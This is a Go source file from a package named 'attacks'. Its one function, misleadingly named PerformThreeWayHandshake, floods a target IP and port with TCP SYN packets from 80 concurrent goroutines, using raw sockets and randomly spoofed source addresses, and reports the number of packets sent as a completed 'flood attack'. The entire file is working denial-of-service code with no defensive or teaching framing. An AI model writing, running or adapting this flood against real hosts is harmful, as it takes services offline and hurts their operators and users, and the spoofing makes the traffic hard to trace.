package attacks

import (
	"context"
	"fmt"
	"math/rand"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

func PerformThreeWayHandshake(targetIP string, targetPort int, duration int) error {
	rand.Seed(time.Now().UnixNano())

	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return fmt.Errorf("invalid target IP address: %s", targetIP)
	}

	var packetCount int64
	var wg sync.WaitGroup
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	for i := 0; i < 80; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				default:
					srcPort := layers.TCPPort(rand.Intn(65535))
					tcpLayer := &layers.TCP{
						SrcPort: srcPort,
						DstPort: layers.TCPPort(targetPort),
						SYN:     true, // Set SYN flag to initiate handshake
						Window:  65535,
					}

					ipLayer := &layers.IPv4{
						SrcIP:    net.IPv4(byte(rand.Intn(256)), byte(rand.Intn(256)), byte(rand.Intn(256)), byte(rand.Intn(256))), // Random source IP
						DstIP:    dstIP,
						Version:  4,
						Protocol: layers.IPProtocolTCP,
						TTL:      64,
					}

					buffer := gopacket.NewSerializeBuffer()
					opts := gopacket.SerializeOptions{}
					if err := gopacket.SerializeLayers(buffer, opts, ipLayer, tcpLayer); err != nil {
						fmt.Printf("Error serializing packet: %v\n", err)
						continue
					}

					if _, err := conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}

					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}

	wg.Wait()
	fmt.Printf("Three-way handshake flood attack completed. Sent %d packets.\n", atomic.LoadInt64(&packetCount))
	return nil
}